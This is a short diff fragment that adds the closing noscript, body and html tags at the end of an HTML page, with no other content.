+</noscript>
+
+</body>
+</html>
